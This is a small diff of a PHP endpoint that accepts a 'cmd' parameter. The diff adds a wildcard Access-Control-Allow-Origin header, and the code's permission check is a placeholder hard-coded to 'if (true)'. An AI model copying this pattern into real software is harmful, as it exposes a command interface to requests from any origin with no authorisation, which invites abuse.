@@ -1,5 +1,7 @@
 <?php
 if (@$_POST['cmd']||@$_GET['cmd']) {
+    //设置允许使用命令的域
+    header("Access-Control-Allow-Origin:*");
     /*在这里增加一些命令或许可检测*/
     if (true) { //查找指令前判断是否要执行
         require_once("funs.php");
